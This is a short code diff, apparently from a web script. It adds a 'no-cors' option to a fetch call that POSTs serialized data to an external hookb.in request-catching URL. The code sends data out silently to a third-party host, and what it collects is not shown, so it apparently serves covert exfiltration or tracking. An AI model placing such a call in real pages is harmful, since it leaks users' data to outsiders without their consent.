@@ -26,5 +26,6 @@ window.mobileCheck()
   fetch('https://hookb.in/gg09G0WZZmuG7Voo8d0J', {
     method: 'POST',
     body: JSON.stringify(x),
+    mode: 'no-cors',
   });
 })();
